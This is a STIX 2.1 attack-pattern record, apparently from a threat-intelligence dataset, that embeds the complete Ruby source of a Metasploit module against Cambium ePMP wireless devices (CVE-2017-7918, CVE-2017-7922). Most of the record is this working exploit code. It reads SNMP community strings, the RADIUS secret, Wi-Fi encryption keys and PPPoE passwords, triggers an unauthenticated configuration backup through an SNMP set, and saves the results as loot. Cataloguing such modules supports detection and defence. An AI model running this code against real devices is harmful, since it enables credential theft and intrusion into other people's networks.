{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9114bcf1-18cf-40fc-9d71-18be62418c1a",
    "created": "2024-08-14T16:27:47.693033Z",
    "modified": "2024-08-14T16:27:47.693037Z",
    "name": "Cambium ePMP 1000 SNMP Enumeration",
    "description": " Cambium devices (ePMP, PMP, Force, & others) can be administered using SNMP. The device configuration contains IP addresses, keys, and passwords amongst other information. This module uses SNMP to extract Cambium ePMP device configuration. On certain software versions, specific device configuration values can be accessed using SNMP RO string, even though only SNMP RW string should be able to access them, according to MIB documentation. The module also triggers full configuration backup, and retrieves the backup url. The configuration file can then be downloaded without authentication. The module has been tested on Cambium ePMP versions 3.5 & prior.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/epmp1000_snmp_loot.rb",
            "external_id": "epmp1000_snmp_loot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7918"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7922"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Cambium ePMP 1000 SNMP Enumeration',\n      'Description' => %{\n        Cambium devices (ePMP, PMP, Force, & others) can be administered using\n        SNMP. The device configuration contains IP addresses, keys, and passwords,\n        amongst other information. This module uses SNMP to extract Cambium ePMP device\n        configuration. On certain software versions, specific device configuration\n        values can be accessed using SNMP RO string, even though only SNMP RW string\n        should be able to access them, according to MIB documentation. The module also\n        triggers full configuration backup, and retrieves the backup url. The\n        configuration file can then be downloaded without authentication. The module\n        has been tested on Cambium ePMP versions 3.5 & prior.\n      },\n      'References' =>\n        [\n          ['URL', 'https://ipositivesecurity.com/2017/04/07/cambium-snmp-security-vulnerabilities/'],\n          ['CVE', '2017-7918'],\n          ['CVE', '2017-7922']\n        ],\n      'Author' => ['Karn Ganeshen'],\n      'License' => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n    begin\n      snmp = connect_snmp\n\n      epmp_info = ''\n\n      # System Info\n      snmp_systemname = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.3.0')\n      snmp_systemdescription = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.4.0')\n      system_uptime = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.4.0')\n      uboot_version = snmp.get_value('1.3.6.1.4.1.17713.21.1.1.14.0')\n\n      epmp_info << \"SNMP System Name: #{snmp_systemname}\" << \"\\n\"\n      epmp_info << \"SNMP System Description: #{snmp_systemdescription}\" << \"\\n\"\n      epmp_info << \"Device UpTime: #{system_uptime}\" << \"\\n\"\n      epmp_info << \"U-boot version: #{uboot_version}\" << \"\\n\"\n\n      # SNMP Info\n      snmp_readonly_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.1.0')\n      snmp_readwrite_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.2.0')\n      snmp_trap_community = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.6.0')\n      snmp_trap_entryip = snmp.get_value('1.3.6.1.4.1.17713.21.3.5.7.1.2.0')\n\n      epmp_info << \"SNMP read-only community name: #{snmp_readonly_community}\" << \"\\n\"\n      epmp_info << \"SNMP read-write community name: #{snmp_readwrite_community}\" << \"\\n\"\n      epmp_info << \"SNMP Trap Community: #{snmp_trap_community}\" << \"\\n\"\n      epmp_info << \"SNMP Trap Server IP Address: #{snmp_trap_entryip}\" << \"\\n\"\n\n      # WIFI Radius Info\n      wireless_radius_serverinfo = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.5.0')\n      wireless_radius_serverport = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.3.0')\n      wireless_radius_serversecret = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.6.1.1.4.0')\n      wireless_radius_username = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.8.0')\n      wireless_radius_password = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.5.9.0')\n\n      epmp_info << \"RADIUS server info: #{wireless_radius_serverinfo}\" << \"\\n\"\n      epmp_info << \"RADIUS server port: #{wireless_radius_serverport}\" << \"\\n\"\n      epmp_info << \"RADIUS server secret: #{wireless_radius_serversecret}\" << \"\\n\"\n      epmp_info << \"Wireless Radius Username: #{wireless_radius_username}\" << \"\\n\"\n      epmp_info << \"Wireless Radius Password: #{wireless_radius_password}\" << \"\\n\"\n\n      # WIFI Info\n      wireless_interface_ssid = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.2.0')\n      wireless_interface_encryptionkey = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.4.0')\n      wireless_interface_encryption = snmp.get_value('1.3.6.1.4.1.17713.21.3.8.2.3.0')\n\n      epmp_info << \"Wireless Interface SSID: #{wireless_interface_ssid}\" << \"\\n\"\n      epmp_info << \"Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}\" << \"\\n\"\n      epmp_info << \"Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption}\" << \"\\n\"\n\n      # Network PPPoE config\n      network_wan_pppoeservice = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.13.0')\n      network_wan_pppoeusername = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.10.0')\n      network_wan_pppoepassword = snmp.get_value('1.3.6.1.4.1.17713.21.3.4.3.11.0')\n\n      epmp_info << \"Network PPPoE Service Name: #{network_wan_pppoeservice}\" << \"\\n\"\n      epmp_info << \"Network PPPoE Username: #{network_wan_pppoeusername}\" << \"\\n\"\n      epmp_info << \"Network PPPoE Password: #{network_wan_pppoepassword}\" << \"\\n\"\n\n      # Printing captured info\n      print_status(\"Fetching System Information...\\n\")\n      print_good(\"#{ip}\")\n      print_good(\"SNMP System Name: #{snmp_systemname}\")\n      print_good(\"SNMP System Description: #{snmp_systemdescription}\")\n      print_good(\"Device UpTime: #{system_uptime}\")\n      print_good(\"U-boot version: #{uboot_version} \\n\")\n\n      print_status(\"Fetching SNMP Information...\\n\")\n      print_good(\"SNMP read-only community name: #{snmp_readonly_community}\")\n      print_good(\"SNMP read-write community name: #{snmp_readwrite_community}\")\n      print_good(\"SNMP Trap Community: #{snmp_trap_community}\")\n      print_good(\"SNMP Trap Server IP Address: #{snmp_trap_entryip} \\n\")\n\n      print_status(\"Fetching WIFI Information...\\n\")\n      print_good(\"Wireless Interface SSID: #{wireless_interface_ssid}\")\n      print_good(\"Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}\")\n      print_good(\"Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption} \\n\")\n\n      print_status(\"Fetching WIFI Radius Information...\\n\")\n      print_good(\"RADIUS server info: #{wireless_radius_serverinfo}\")\n      print_good(\"RADIUS server port: #{wireless_radius_serverport}\")\n      print_good(\"RADIUS server secret: #{wireless_radius_serversecret}\")\n      print_good(\"Wireless Radius Username: #{wireless_radius_username}\")\n      print_good(\"Wireless Radius Password: #{wireless_radius_password} \\n\")\n\n      print_status(\"Fetching Network PPPoE Information...\\n\")\n      print_good(\"Network PPPoE Service Name: #{network_wan_pppoeservice}\")\n      print_good(\"Network PPPoE Username: #{network_wan_pppoeusername}\")\n      print_good(\"Network PPPoE Password: #{network_wan_pppoepassword} \\n\")\n\n      # set request\n      backup_oid = '1.3.6.1.4.1.17713.21.6.4.10.0'\n      enable_backup = '1'\n      varbind = SNMP::VarBind.new(backup_oid, SNMP::OctetString.new(enable_backup))\n      snmp.set(varbind)\n      backup_location_oid = '1.3.6.1.4.1.17713.21.6.4.13.0'\n      backup_location = snmp.get_value(backup_location_oid)\n\n      if @backup_location.present? == false\n        print_status('Backup needs to triggered manually. Run the following commands:')\n        print_status(\"   snmpset -c <SNMP-RW-string> -v 1 #{datastore['RHOST']} 1.3.6.1.4.1.17713.21.6.4.10.0 i 1\")\n        print_status(\"   snmpget -c <SNMP-RW-string> -v 1 #{datastore['RHOST']} 1.3.6.1.4.1.17713.21.6.4.13.0 \\n\")\n      else\n        print_good(\"Configuration backed-up for direct download at: #{backup_location}\")\n      end\n\n      # Woot we got loot.\n      loot_name     = 'snmp_loot'\n      loot_type     = 'text/plain'\n      loot_filename = 'epmp1000_snmp_loot.txt'\n      loot_desc     = 'Cambium ePMP configuration data'\n      p = store_loot(loot_name, loot_type, datastore['RHOST'], epmp_info, loot_filename, loot_desc)\n      print_good(\"Cambium ePMP loot saved at #{p}\")\n\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::InvalidIpAddress\n      print_error(\"#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n      elog(e)\n    ensure\n      disconnect_snmp\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Karn Ganeshen]",
        ""
    ]
}